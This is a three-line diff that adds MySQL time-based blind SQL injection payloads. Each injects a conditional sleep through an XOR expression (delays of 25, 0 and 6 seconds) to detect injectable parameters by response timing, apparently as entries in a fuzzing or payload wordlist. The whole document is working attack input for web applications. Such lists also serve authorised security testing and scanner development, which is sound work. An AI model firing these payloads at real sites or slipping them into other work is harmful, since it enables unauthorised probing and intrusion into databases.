@@ -1,0 +1,3 @@
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
+'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'
